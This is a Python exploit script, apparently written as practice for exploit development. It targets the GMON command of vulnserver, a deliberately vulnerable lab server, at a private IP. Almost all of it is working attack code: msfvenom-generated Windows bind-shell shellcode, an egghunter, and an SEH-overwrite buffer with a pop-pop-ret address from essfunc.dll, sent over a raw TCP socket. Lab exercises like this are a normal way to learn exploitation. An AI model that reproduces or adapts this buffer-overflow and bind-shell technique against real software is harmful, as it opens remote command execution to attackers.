#!/usr/bin/python

import socket
import sys

host = "172.16.66.128"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver GMON Exploit
## badchars = '\x00' 
## SEH
## Log data, item 14  Address=6250120B  Message=  0x6250120b : pop ecx # pop ecx # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\van6uard\Desktop\vulnserver\essfunc.dll)
## van6uard@kali:~$ msfvenom -p windows/shell_bind_tcp -f c -b '\x00' EXITFUNC=thread
## [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
## [-] No arch selected, selecting arch: x86 from the payload
## Found 11 compatible encoders
## Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
## x86/shikata_ga_nai succeeded with size 355 (iteration=0)
## x86/shikata_ga_nai chosen with final size 355
## Payload size: 355 bytes
## Final size of c file: 1516 bytes
shellcode = ( 
"\xdb\xd9\xd9\x74\x24\xf4\xba\x0e\x23\x1b\xe9\x58\x2b\xc9\xb1"
"\x53\x31\x50\x17\x83\xe8\xfc\x03\x5e\x30\xf9\x1c\xa2\xde\x7f"
"\xde\x5a\x1f\xe0\x56\xbf\x2e\x20\x0c\xb4\x01\x90\x46\x98\xad"
"\x5b\x0a\x08\x25\x29\x83\x3f\x8e\x84\xf5\x0e\x0f\xb4\xc6\x11"
"\x93\xc7\x1a\xf1\xaa\x07\x6f\xf0\xeb\x7a\x82\xa0\xa4\xf1\x31"
"\x54\xc0\x4c\x8a\xdf\x9a\x41\x8a\x3c\x6a\x63\xbb\x93\xe0\x3a"
"\x1b\x12\x24\x37\x12\x0c\x29\x72\xec\xa7\x99\x08\xef\x61\xd0"
"\xf1\x5c\x4c\xdc\x03\x9c\x89\xdb\xfb\xeb\xe3\x1f\x81\xeb\x30"
"\x5d\x5d\x79\xa2\xc5\x16\xd9\x0e\xf7\xfb\xbc\xc5\xfb\xb0\xcb"
"\x81\x1f\x46\x1f\xba\x24\xc3\x9e\x6c\xad\x97\x84\xa8\xf5\x4c"
"\xa4\xe9\x53\x22\xd9\xe9\x3b\x9b\x7f\x62\xd1\xc8\x0d\x29\xbe"
"\x3d\x3c\xd1\x3e\x2a\x37\xa2\x0c\xf5\xe3\x2c\x3d\x7e\x2a\xab"
"\x42\x55\x8a\x23\xbd\x56\xeb\x6a\x7a\x02\xbb\x04\xab\x2b\x50"
"\xd4\x54\xfe\xcd\xdc\xf3\x51\xf0\x21\x43\x02\xb4\x89\x2c\x48"
"\x3b\xf6\x4d\x73\x91\x9f\xe6\x8e\x1a\x8e\xaa\x07\xfc\xda\x42"
"\x4e\x56\x72\xa1\xb5\x6f\xe5\xda\x9f\xc7\x81\x93\xc9\xd0\xae"
"\x23\xdc\x76\x38\xa8\x33\x43\x59\xaf\x19\xe3\x0e\x38\xd7\x62"
"\x7d\xd8\xe8\xae\x15\x79\x7a\x35\xe5\xf4\x67\xe2\xb2\x51\x59"
"\xfb\x56\x4c\xc0\x55\x44\x8d\x94\x9e\xcc\x4a\x65\x20\xcd\x1f"
"\xd1\x06\xdd\xd9\xda\x02\x89\xb5\x8c\xdc\x67\x70\x67\xaf\xd1"
"\x2a\xd4\x79\xb5\xab\x16\xba\xc3\xb3\x72\x4c\x2b\x05\x2b\x09"
"\x54\xaa\xbb\x9d\x2d\xd6\x5b\x61\xe4\x52\x7b\x80\x2c\xaf\x14"
"\x1d\xa5\x12\x79\x9e\x10\x50\x84\x1d\x90\x29\x73\x3d\xd1\x2c"
"\x3f\xf9\x0a\x5d\x50\x6c\x2c\xf2\x51\xa5"
)

hunter = ( 
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        )


## buf = 'GMON / .:/' + NOPS + egg + shellcode + nSEH + SEH + junk 
buf = 'GMON / .:/' + '\x90'*64 + 'w00tw00t' + shellcode + 'A'*(3404-8-len(shellcode)) + hunter + 'B'*(46-32) + '\xeb\xd0\x90\x90' + '\x0b\x12\x50\x62' + 'D'*(5000-3514-4)


try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
